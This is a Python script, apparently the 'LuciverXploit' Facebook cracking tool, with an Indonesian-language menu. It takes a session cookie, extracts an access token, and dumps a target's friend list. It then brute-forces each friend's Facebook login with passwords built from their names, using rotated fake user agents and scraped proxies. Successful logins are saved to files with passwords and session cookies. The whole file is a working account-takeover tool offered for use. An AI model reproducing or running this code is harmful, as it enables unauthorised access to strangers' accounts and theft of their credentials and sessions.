import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

pretty.install()
CON=sol()
ugen=[]
mbaY=[]
fields=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mLuciverXploit')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ["JDQ39", "JZO54K"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   strvoppo = f"Mozilla/5.0 Linux; Android {str(rr(6,13))}; SM-A310F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GSA/12.22.8.23.arm"
   strvredmi = f"Mozilla/5.0 Linux; Android {str(rr(6,13))}; CPH2219 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 Linux; Android {str(rr(6,13))}; SM-A310F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 OPR/44.1.2254.143214"
   strvinfinix = f"Mozilla/5.0 Linux; Android {str(rr(6,13))}; CPH2219 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
   uakulah = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix])
   ugen.append(uakulah)    

    

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
mbaY=[]
pwpluss,pwnya=[],[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\x1b[1;94m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def luciver_xp(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.00)
def clear():
	os.system('clear')
def back():
	login()
def ler():
	print(f'\x1b[1;97m──────[ {h}Menu Crack\x1b[1;97m]──────')
def upin():
	print(f'\x1b[1;97m──────[ {h}Urutan Crack \x1b[1;97m]──────')
def ipin():
	print(f'\x1b[1;97m──────[ {h}Methode Crack \x1b[1;97m]──────')

def banner():
	clear()
	luciver_xp(f'''\x1b[1;92m █████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93m2024 Spesial\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;96m Arya Shule  \x1b[1;97m               ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/LuciverXp\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/LuciverTrojans\x1b[\x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[•] Aku Adalah Luciver Xploit Yang Ganteng\n''')              

def login():
	os.system('clear')
	banner()
	cok = input(f'{p}Masukkan cookie :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				exit(f"Token : {took} \ncookies aktif jalankan ulang scriptnya")
	except Exception as e:exit(e)

def menu():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'{m}cookies telah kadaluarsa bro')
		time.sleep(4)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		login()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'\x1b[1;97m┌─Nama  : {h}%s'%(nama))
	print(f'\x1b[1;97m├─Idz   :{h} '+str(uidfb))
	print(f'\x1b[1;97m├─Ip    :{h} {ip}\x1b[1;97m')
	print(f'└─\x1b[1;97mAuthor\x1b[1;97m: [{h}LuciverXploit\x1b[1;97m] ')
	print('')
	ler()
	print(f'┌─[{h}1\x1b[1;97m] Super Multi Bruteforce Facebook ')
	print(f'\x1b[1;97m├─[{h}2\x1b[1;97m] Crack Hasil Eror')
	print(f'\x1b[1;97m└─[{h}0\x1b[1;97m] Back       ')
	_____luciver__xploit_____ = input(f'\n└───➢ Pilih : ')
	if _____luciver__xploit_____ in ['1']:
	        idt = input('\n┌─➢ ID Target : ')
	        dump(idt,"",{"cookie":cok},token)
	        setting()
	elif _____luciver__xploit_____ in ['6']:
		dump_follower()
	elif _____luciver__xploit_____ in ['3']:
		grup()
	elif _____luciver__xploit_____ in ['4']:
		crack_file()
	elif _____luciver__xploit_____ in ['5']:
		crack_email()
	elif _____luciver__xploit_____ in ['2']:
		result()
	elif _____luciver__xploit_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('➢ Sukses Logout+Hapus Kukis ')
		back()
	else:
		print('➢ Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}➢ Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	exit()

def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r└─ Dump : {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass


def setting():
	os.system('clear')
	banner()
	print('')
	upin()
	print(f'┌─[{h}1\x1b[1;97m] Akun Old ')
	print(f'\x1b[1;97m├─[{h}2\x1b[1;97m] Akun New ')
	print(f'\x1b[1;97m├─[{h}3\x1b[1;97m] Akun Random ')
	hu = input(f'\x1b[1;97m└─Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'[{h}•\x1b[1;97m]Pilih Yang Bener Kontooll ')
		exit()
	os.system('clear')
	banner()
	print('')
	ipin()
	print(f'┌─[{h}1\x1b[1;97m] Mobile ')
	hc = input(f'\x1b[1;97m└─Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('[{h}•\x1b[1;97m]Pilih Yang Bener Kontooll  ')
		setting()
	else:
		method.append('mobile')
	print('')
	pwplus=input(f'┌─Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('└─Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

def passwrd():
	os.system('clear')
	banner()
	print(f'\r {h}  ➢● {N}Bismillah Dulu Sayang')
	print(f' {N}    ┌─{h}● {h}OK/%s '%(okc))
	print(f' {N}    └─{h}● {k}CP/%s '%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0] 
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
					pwv.append(frs+'02')
					pwv.append(frs+'0')
					pwv.append(frs+'00')
					pwv.append(frs+'11')
					pwv.append(frs+'12')
					pwv.append(frs+'1212')
					pwv.append(frs+'09')
					pwv.append(frs+'01')
					pwv.append(frs+'20')
					pwv.append(frs+'77')
					pwv.append(frs+'999')
					pwv.append(frs+'1')
					pwv.append(frs+'2')
					pwv.append(frs+'3')
					pwv.append(frs+'4')
					pwv.append(frs+'5')
					pwv.append(frs+'6')
					pwv.append(frs+'7')
					pwv.append(frs+'8')
					pwv.append(frs+'9')
					pwv.append(frs+'10')
					pwv.append(frs+'96')
					pwv.append(frs+'03')
					pwv.append(frs+'@')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'54321')
					pwv.append(frs+'654321')
					pwv.append(frs+'085')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
					pwv.append(frs+'21')
					pwv.append(nmf)
					pwv.append(frs+'22')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print(f'{N}┌─{h}● {N}Crack Selesai')	
	print(f'{N}├─{h}● {N}OK : {h}%s '%(ok))
	print(f'{N}└─{h}● {N}CP : {k}%s{x} '%(cp))
	print(f'\x1b[1;97m┌─Lanjut Crack Kembali ( {h}Y\x1b[1;97m/{m}t\x1b[1;97m ) ? ')
	woi = input('└─Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\r {h}  ➢● {N}Dadah Sayang')
		time.sleep(2)
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v8.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'RW01gY2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqVi0LMUgCHNzLdLS+5lvlLnRgplESoVeUHKj4pMGYJWZrDACA==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=290293790992170&auth_token=42daecc7930acde214740b8da04f49d4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&refsrc=deprecated&app_id=290293790992170&cancel=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}┌─➢●CHECKPOINT')
				print(f'\r┌─ {P}Username : {K}{idf}{N}')
				print(f'\r├─ {P}Password  : {K}{pw}{N}')
				print(f'\r└─ {P}UserAgent  : {K}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{K}┌─➢●SUKSES LOGIN')
				print(f'\r┌─ {P}Username : {H}{idf}{N}')
				print(f'\r├─ {P}Password  : {H}{pw}{N}')
				print(f'\r└─ {P}Cookies     : {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	time.sleep(3)
	menu()
